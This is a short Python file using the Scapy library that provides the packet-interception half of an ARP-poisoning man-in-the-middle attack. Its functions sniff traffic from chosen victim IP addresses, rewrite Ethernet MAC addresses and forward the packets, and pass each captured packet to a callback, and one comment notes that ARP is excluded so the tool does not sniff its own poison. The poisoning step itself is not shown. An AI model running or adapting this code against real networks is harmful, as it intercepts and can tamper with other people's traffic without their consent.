from scapy.all import *

def forward(pkt, self_mac, dst_mac, interface):
	pkt[Ether].dst = dst_mac
	pkt[Ether].src = self_mac
	sendp(pkt, iface=interface)
	
def start_targeted_sniff(target_src_ips, interface, lmb):
	# todo maybe add functionality to target certaiin protoccols/dsts
	while True:
		# always exclude arp to not sniff our own poison
		pkt = sniff(iface=interface, count=1, filter="not arp")[0]
		print(pkt.summary())
		if IP in pkt and pkt[IP].src in target_src_ips:
			return pkt

def capture_and_forward(src_ip, dst_mac, self_mac, interface, callback):
	while True:
		pkt = sniff(
			iface=interface, 
			count=1, 
			prn=lambda p: forward(p, self_mac, dst_mac, interface),
			filter=f"src host {src_ip}")[0]
		callback(pkt)
